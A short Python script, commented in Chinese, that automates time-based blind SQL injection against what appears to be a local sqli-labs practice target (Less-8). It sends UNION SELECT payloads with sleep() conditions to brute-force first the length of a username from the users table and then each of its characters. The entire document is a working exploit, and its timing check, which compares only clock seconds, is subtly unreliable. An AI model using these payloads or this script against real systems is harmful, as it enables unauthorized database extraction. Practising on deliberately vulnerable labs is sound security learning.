# 用于进行时间盲注的脚本

import requests
import time

# 设置时间延迟
time_sleep = 2


def length_request():
    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }
    # 暴力破解位数
    for i in range(1, 100000):
        urls = rf"http://sqlss.sql/Less-8/?id=-1' union select 1,2,if(length((select username from users limit 1,1))={i},sleep({time_sleep}),null)-- +"
        # 获取当前的时间
        now = float(time.strftime('%S', time.localtime(time.time())))
        res = requests.get(url=urls, headers=heads)
        if res.status_code == 200:
            res.close()
            last = float(time.strftime('%S', time.localtime(time.time())))
            if last - now >= time_sleep:
                return i


def suite_message(nums):
    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    }
    # 暴力破解每一个字符
    strings = ''
    print(f'总共字符数量为：{nums}个')
    for i in range(1, nums + 1):
        for j in range(30, 126):
            urls = rf"http://sqlss.sql/Less-8/?id=-1' union select 1,2,if(ascii(substr((select username from users limit 1,1),{i},1))={j},sleep({time_sleep}),null)-- +"
            # 获取当前的时间
            now = float(time.strftime('%S', time.localtime(time.time())))
            res = requests.get(url=urls, headers=heads)
            if res.status_code == 200:
                res.close()
                last = float(time.strftime('%S', time.localtime(time.time())))
                if last - now >= time_sleep:
                    strings += chr(j)
                    print(f'已经完成了第{i}个字符')
                    break
    print(f'数据为：{strings}')


if __name__ == '__main__':
    leng = length_request()
    suite_message(leng)
